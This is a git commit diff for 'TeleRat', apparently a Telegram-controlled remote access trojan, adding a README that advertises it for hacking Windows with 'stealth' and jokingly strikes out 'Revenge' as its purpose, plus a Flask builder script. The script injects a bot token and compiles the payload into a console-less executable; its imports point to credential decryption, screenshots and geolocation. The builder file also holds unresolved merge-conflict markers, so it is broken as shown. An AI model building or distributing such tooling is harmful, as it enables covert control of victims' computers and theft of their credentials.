d3d41d85a9aba92544a63e4fe4a9d6c9227b464d
navin-hariharan <pepperjack1210@gmail.com>
2021-08-18 14:12:40 +0530

    Exe Build

---
+++ README.md
@@ -0,0 +1,43 @@
+<h1 align="center">TeleRat</h1>
+<p align="center">Hack windows using Telegram</p><br>
+
+<p align="center">
+  <img src="https://www.nicepng.com/png/full/52-520574_python-telegram-bot-logo-sign.png" width="200" height="250"> <br>
+</p>
+
+## -> Note:
+
+- This project is made for ~~Revenge~~ **Educational** purposes only
+- **I am not responsible for the misuse of TeleRat.**
+<br>
+
+## -> Features:
+
+- Stealth
+- No Server needed
+- No Portforwarding needed
+- Best Metasploit alternative
+
+## -> Future Updates (TO DO):
+- Automatic updating mechanism
+- Dm me your ideas on my Instagram
+
+## -> Usage:
+
+<details>
+ <summary>How to use TeleRat</summary>
+  <br><br><p>Create a Bot from Bothfather in Telegram:-  <a href="https://t.me/botfather">BotFather</a> </p>
+  <img src="https://miro.medium.com/max/1400/0*sN1drV8eont63peu" width="870" height="688"> <br>
+</details>
+
+## Support the Developer 
+
+<a href="https://www.buymeacoffee.com/navinhariharan" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/arial-yellow.png" alt="Buy Me A Coffee" width="217px" ></a> 
+
+# CONTACT ME:
+
+Feel Free To Open An Issue...
+
+```
+Instagram: navin_hariharan
+```
---
+++ Source_Files/build.py
@@ -0,0 +1,97 @@
+<<<<<<< HEAD
+import os,wget,PyInstaller,telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder
+from telebot import types
+from shutil import copyfile
+from Crypto.Cipher import AES
+from flaskwebgui import FlaskUI
+from datetime import timezone, datetime, timedelta
+from flask import Flask, render_template, request
+
+app = Flask(__name__)
+
+@app.route('/')
+def welcome():
+    return render_template("Build.html")
+
+@app.route('/build',methods=['POST','GET'])
+def output():
+    start(request.form['key'])
+    return render_template("Built.html")
+
+def start(bot_token):
+        with open('Source_Files/telerat.py', 'r') as file :
+            filedata = file.read()
+        if 'ENTER_YOUR_BOT_TOKEN_HERE' in filedata:
+            filedata = filedata.replace('ENTER_YOUR_BOT_TOKEN_HERE',bot_token)
+        with open('Source_Files/telerat.py', 'w') as file:
+            file.write(filedata)
+
+
+        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/telerat.py')
+        os.system('rd /s /q build')
+        os.remove('telerat.spec')
+        copyfile('dist/telerat.exe', 'telerat.exe')
+        os.system('rd /s /q dist')
+
+
+        with open('Source_Files/telerat.py', 'r') as file :
+            filedata = file.read()
+        if bot_token in filedata:
+            filedata = filedata.replace(bot_token,'ENTER_YOUR_BOT_TOKEN_HERE')
+        with open('Source_Files/telerat.py', 'w') as file:
+            file.write(filedata)
+
+if __name__ == '__main__':
+    FlaskUI(app, width=360, height=590).run()
+=======
+import os,wget,pyinstaller
+from shutil import copyfile
+from flaskwebgui import FlaskUI
+from flask import Flask, render_template, request
+
+app = Flask(__name__)
+
+@app.route('/')
+def welcome():
+    return render_template("Build.html")
+
+@app.route('/build',methods=['POST','GET'])
+def output():
+    start(request.form['key'])
+    return render_template("Built.html")
+
+@app.errorhandler(500)
+def internal_error(error):
+    os.remove('Source_Files\telerat.py')
+    wget.download('https://raw.githubusercontent.com/navin-hariharan/TeleRat/main/Source_Files/telerat.py','Source_Files\telerat.py')
+
+@app.errorhandler(404)
+def not_found(error):
+    return render_template("Build.html")
+
+def start(bot_token):
+        with open('Source_Files/telerat.py', 'r') as file :
+            filedata = file.read()
+        if 'ENTER_YOUR_BOT_TOKEN_HERE' in filedata:
+            filedata = filedata.replace('ENTER_YOUR_BOT_TOKEN_HERE',bot_token)
+        with open('Source_Files/telerat.py', 'w') as file:
+            file.write(filedata)
+
+
+        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/telerat.py')
+        os.system('rd /s /q build')
+        os.remove('telerat.spec')
+        copyfile('dist/telerat.exe', 'telerat.exe')
+        os.system('rd /s /q dist')
+
+
+        with open('Source_Files/telerat.py', 'r') as file :
+            filedata = file.read()
+        if bot_token in filedata:
+            filedata = filedata.replace(bot_token,'ENTER_YOUR_BOT_TOKEN_HERE')
+        with open('Source_Files/telerat.py', 'w') as file:
+            file.write(filedata)
+
+if __name__ == '__main__':
+    FlaskUI(app, width=360, height=590).run()
+>>>>>>> c2f7f8f66e88b7fe69520e180b98f499f96143c4
